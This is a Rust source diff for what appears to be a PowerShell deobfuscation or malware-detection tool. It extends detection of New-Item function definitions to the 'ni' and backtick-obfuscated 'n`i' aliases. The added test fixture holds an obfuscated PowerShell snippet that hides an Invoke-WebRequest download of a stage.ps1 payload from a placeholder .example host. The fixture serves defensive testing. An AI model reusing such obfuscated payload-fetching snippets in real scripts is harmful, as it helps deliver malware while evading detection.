@@ -948,7 +948,8 @@ static PS_FUNCTION_DEF_RE: Lazy<Regex> = Lazy::new(|| {
 
 #[allow(clippy::expect_used)]
 static PS_NEW_ITEM_FUNCTION_DEF_RE: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(r#"(?is)\bNew-Item\b([^{}]{0,512})\{"#).expect("ps new-item function def regex")
+    Regex::new(r#"(?is)\b(?:New-Item|n`?i)\b([^{}]{0,512})\{"#)
+        .expect("ps new-item function def regex")
 });
 
 #[allow(clippy::expect_used)]
@@ -3463,7 +3464,17 @@ fn expand_literal_split_index_extractor_calls(text: &str) -> String {
 }
 
 fn has_literal_extractor_def_signal(lower: &str) -> bool {
-    lower.contains("function ") || lower.contains("new-item")
+    lower.contains("function ") || lower.contains("new-item") || has_new_item_alias_signal(lower)
+}
+
+fn has_new_item_alias_signal(lower: &str) -> bool {
+    lower.starts_with("ni ")
+        || lower.starts_with("n`i ")
+        || [
+            " ni ", "(ni ", ";ni ", "\nni ", " n`i ", "(n`i ", ";n`i ", "\nn`i ",
+        ]
+        .iter()
+        .any(|needle| lower.contains(needle))
 }
 
 fn literal_substring_extractor_defs(text: &str) -> Vec<(String, String, String)> {
@@ -5029,7 +5040,8 @@ impl PsObfuscationSignals {
         let has_function_def = lower.contains("function ")
             || lower.contains("-name ")
             || lower.contains("-n ")
-            || lower.contains("new-item");
+            || lower.contains("new-item")
+            || has_new_item_alias_signal(&lower);
         let invoke_wrapper = has_function_def && lower.contains("invoke-expression");
         let dot_replace = lower.contains(".replace");
         let trim_extractor = has_function_def && lower.contains(".trim");
@@ -7303,6 +7315,24 @@ Clean '~~~Invoke-WebRequest -Uri https://ps-new-item-path-function-extractor.exa
                 "'Invoke-WebRequest -Uri https://ps-new-item-path-function-extractor.example/stage.ps1'"
             ),
             "New-Item function path-name trim extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_new_item_alias_function_path_name_trim_extractor_call_is_rewritten() {
+        let text = r#"(n`i Function:\Clean -Value {
+  param($value,$chars)
+  return $value.Trim($chars)
+});
+Clean '~~~Invoke-WebRequest -Uri https://ps-ni-path-function-extractor.example/stage.ps1~~~' '~'"#;
+
+        let out = expand_literal_trim_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-ni-path-function-extractor.example/stage.ps1'"
+            ),
+            "New-Item alias function path-name trim extractor call was not rewritten:\n{out}"
         );
     }
 
